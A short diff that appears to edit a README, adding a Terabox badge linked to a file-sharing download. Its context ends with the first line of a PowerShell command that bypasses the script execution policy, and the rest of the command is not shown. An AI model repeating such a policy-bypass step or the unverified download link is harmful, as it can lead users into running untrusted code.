@@ -10,6 +10,8 @@
 
 [![TERABOX](https://1024terabox.com/s/1L4w50XZOyqo3yhQL8Y630A)](https://www.1024tera.com/sharing/init?surl=Wu-qN3h0Lt_6CrWfgOwzng)
 
+[![TERABOX](https://img.shields.io/badge/Terabox-D9272E?style=for-the-badge&logo=terabox&logoColor=white)](https://www.1024tera.com/sharing/init?surl=Wu-qN3h0Lt_6CrWfgOwzng)
+
 
 ---
 Set-ExecutionPolicy Bypass -Scope Process -Force; `
